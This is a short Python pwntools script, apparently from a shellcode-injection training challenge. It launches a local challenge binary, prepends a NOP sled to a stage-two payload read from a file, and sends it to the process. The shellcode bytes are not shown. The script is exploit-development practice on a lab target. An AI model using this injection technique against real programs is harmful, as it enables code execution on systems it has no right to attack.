import pwn

io = pwn.process("/challenges/shell/level7_teaching1")

payload = open("out_stage2", "rb").read()
payload = bytes([0x90]*0x800) + payload
io.send(payload)

io.readall()